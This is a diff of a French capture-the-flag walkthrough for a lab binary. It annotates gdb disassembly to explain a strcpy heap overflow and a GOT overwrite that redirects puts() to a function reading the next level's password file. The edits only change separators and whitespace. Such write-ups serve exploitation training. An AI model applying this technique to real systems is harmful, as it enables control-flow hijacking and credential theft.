@@ -52,7 +52,7 @@ Dump of assembler code for function main:			|	Accrochez vous car ce walkthrough 
    0x0804857f <+94>:	mov    %eax,%edx			|					(end)						
    0x08048581 <+96>:	mov    0x18(%esp),%eax			|											
    0x08048585 <+100>:	mov    %edx,0x4(%eax)	       (5b)	|	Le pattern se répète donc deux fois (a) & (b).					
-   --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    0x08048588 <+103>:	mov    0xc(%ebp),%eax	      AV[0]	|	STRCPY PATTERN												OVERWRITE ATTEMPT
    0x0804858b <+106>:	add    $0x4,%eax    AV[0]+4 = AV[1]	|														
    0x0804858e <+109>:	mov    (%eax),%eax			|	(1) On récupère (a)l'argument AV[1] "AAAA" / (b)l'argument AV[2] "BBBB" 				On tente ici de réérire sur l'adressse du malloc2 avec une adresse de notre choix 0xbfffffff.
@@ -71,7 +71,7 @@ Dump of assembler code for function main:			|	Accrochez vous car ce walkthrough 
    0x080485b6 <+149>:	mov    %edx,0x4(%esp)			|	0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 --> adresse malloc2		- AV[1] = OFFSET DE 20 + MYADDRESS
    0x080485ba <+153>:	mov    %eax,(%esp)			|	0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000				- AV[2] -> MYADDRESS
    0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>  (3b)	|										   suite-->
-   -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+   ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    0x080485c2 <+161>:	mov    $0x80486e9,%edx		(1) 0x80486e9 = "r"
    0x080485c7 <+166>:	mov    $0x80486eb,%eax		(2) 0x80486eb = "/home/user/level8/.pass"
    0x080485cc <+171>:	mov    %edx,0x4(%esp)
@@ -87,9 +87,7 @@ Dump of assembler code for function main:			|	Accrochez vous car ce walkthrough 
    0x080485f7 <+214>:	call   0x8048400 <puts@plt>	(7) Nous renvoie les "~~" cette fonction nous est d'aucune utilité. Réutilisons l'exploit GOT. 
    			--------------------------------------------------------------------------------------------------------------------------------------------
 			Nous allons utiliser la methodologie du level5. Nous allons modifier la GOT en remplacant l'adresse sensé contenir puts() par l'adresse 
-			de notre fonction <m> :
-				 |	
-				 |
+			de notre fonction <m> :	
 			
 			(gdb) disas puts						(gdb) p &m
 			Dump of assembler code for function puts@plt:			$1 = (<text variable, no debug info> *) 0x80484f4 <m>
